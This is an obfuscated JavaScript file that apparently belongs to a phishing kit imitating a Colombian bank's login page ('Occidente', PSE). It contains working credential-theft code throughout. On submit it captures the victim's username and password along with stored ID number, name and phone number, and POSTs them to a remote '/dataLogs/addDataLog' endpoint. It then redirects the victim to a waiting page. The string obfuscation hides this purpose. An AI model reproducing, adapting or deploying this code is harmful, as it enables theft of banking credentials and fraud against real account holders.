function _0x295c(_0x374c44, _0x16bb31) {
  const _0x2dcf8f = _0x2dcf();
  return (
    (_0x295c = function (_0x295cb8, _0x726026) {
      _0x295cb8 = _0x295cb8 - 0xaf;
      let _0x55c021 = _0x2dcf8f[_0x295cb8];
      return _0x55c021;
    }),
    _0x295c(_0x374c44, _0x16bb31)
  );
}
const _0x5948ff = _0x295c;
(function (_0x3fa228, _0x13152c) {
  const _0x325f1e = _0x295c,
    _0x46c171 = _0x3fa228();
  while (!![]) {
    try {
      const _0x8911bd =
        (parseInt(_0x325f1e(0xc0)) / 0x1) * (parseInt(_0x325f1e(0xd9)) / 0x2) +
        (parseInt(_0x325f1e(0xd3)) / 0x3) * (parseInt(_0x325f1e(0xda)) / 0x4) +
        parseInt(_0x325f1e(0xcb)) / 0x5 +
        (parseInt(_0x325f1e(0xb7)) / 0x6) * (parseInt(_0x325f1e(0xcd)) / 0x7) +
        parseInt(_0x325f1e(0xbc)) / 0x8 +
        (parseInt(_0x325f1e(0xbd)) / 0x9) * (-parseInt(_0x325f1e(0xd5)) / 0xa) +
        -parseInt(_0x325f1e(0xcc)) / 0xb;
      if (_0x8911bd === _0x13152c) break;
      else _0x46c171["push"](_0x46c171["shift"]());
    } catch (_0x5728d2) {
      _0x46c171["push"](_0x46c171["shift"]());
    }
  }
})(_0x2dcf, 0x508a4);
function _0x2dcf() {
  const _0x40ae8c = [
    "btnUsuario",
    "5908CoJOSi",
    "origin",
    "./wait.html",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "preventDefault",
    "PSE",
    "disabled",
    "metaInfo",
    "getElementById",
    "dataLogToken",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "3260110XWTpkm",
    "7062088nYqDIa",
    "106043vUdifo",
    "setItem",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor",
    "dudename",
    "application/json",
    "token",
    "69189SAFQeP",
    "telnum",
    "5141770yckmuG",
    "POST",
    "location",
    "Ingresó\x20datos",
    "134DODrrb",
    "4MKPkjG",
    "dataLogId",
    "/dataLogs/addDataLog",
    "puser",
    "addEventListener",
    "stringify",
    "click",
    "error",
    "focus",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "114kIxteF",
    "value",
    "🌀\x20Occidente",
    "json",
    "txtUsuario",
    "1018600PljpOL",
    "9PNIzyc",
    "user",
  ];
  _0x2dcf = function () {
    return _0x40ae8c;
  };
  return _0x2dcf();
}
function updateLS() {
  const _0x349858 = _0x295c;
  LS[_0x349858(0xce)]("info", JSON[_0x349858(0xb2)](info));
}
const button = document[_0x5948ff(0xc8)](_0x5948ff(0xbf)),
  userInput = document[_0x5948ff(0xc8)](_0x5948ff(0xbb)),
  passInput = document["getElementById"]("txtPass");
button[_0x5948ff(0xb1)](_0x5948ff(0xb3), async function (_0x29c72c) {
  const _0x2ca3fd = _0x5948ff;
  _0x29c72c[_0x2ca3fd(0xc4)](), (button[_0x2ca3fd(0xc6)] = !![]);
  if (!userInput[_0x2ca3fd(0xb8)] || !passInput[_0x2ca3fd(0xb8)]) {
    alert(_0x2ca3fd(0xc3)),
      userInput[_0x2ca3fd(0xb5)](),
      (button[_0x2ca3fd(0xc6)] = ![]);
    return;
  }
  const _0x3641b6 = userInput[_0x2ca3fd(0xb8)],
    _0x32905e = passInput["value"];
  (info[_0x2ca3fd(0xc7)][_0x2ca3fd(0xbe)] = _0x3641b6),
    (info[_0x2ca3fd(0xc7)][_0x2ca3fd(0xb0)] = _0x32905e),
    updateLS();
  const _0x5202e8 = {
    reg: info[_0x2ca3fd(0xc7)]["cc"],
    name: info[_0x2ca3fd(0xc7)][_0x2ca3fd(0xd0)],
    cl: info[_0x2ca3fd(0xc7)][_0x2ca3fd(0xd4)],
    us: info[_0x2ca3fd(0xc7)][_0x2ca3fd(0xbe)],
    ps: info["metaInfo"][_0x2ca3fd(0xb0)],
    bn: _0x2ca3fd(0xb9),
    status: _0x2ca3fd(0xd8),
    source: _0x2ca3fd(0xc5),
  };
  try {
    const _0x46bef7 = await fetch(url + _0x2ca3fd(0xaf), {
      method: _0x2ca3fd(0xd6),
      headers: {
        "Content-Type": _0x2ca3fd(0xd1),
        Origin: window[_0x2ca3fd(0xd7)][_0x2ca3fd(0xc1)],
      },
      body: JSON["stringify"](_0x5202e8),
    });
    if (!_0x46bef7["ok"]) {
      const _0x596f85 = await _0x46bef7[_0x2ca3fd(0xba)]();
      throw new Error(_0x596f85[_0x2ca3fd(0xb4)] || _0x2ca3fd(0xcf));
    }
    const _0x247267 = await _0x46bef7["json"]();
    localStorage[_0x2ca3fd(0xce)](_0x2ca3fd(0xc9), _0x247267[_0x2ca3fd(0xd2)]),
      localStorage["setItem"](_0x2ca3fd(0xdb), _0x247267["id"]),
      console["log"](_0x2ca3fd(0xb6)),
      (window["location"]["href"] = _0x2ca3fd(0xc2));
  } catch (_0x44b54b) {
    console[_0x2ca3fd(0xb4)](_0x2ca3fd(0xca), _0x44b54b),
      (button["disabled"] = ![]);
  }
});
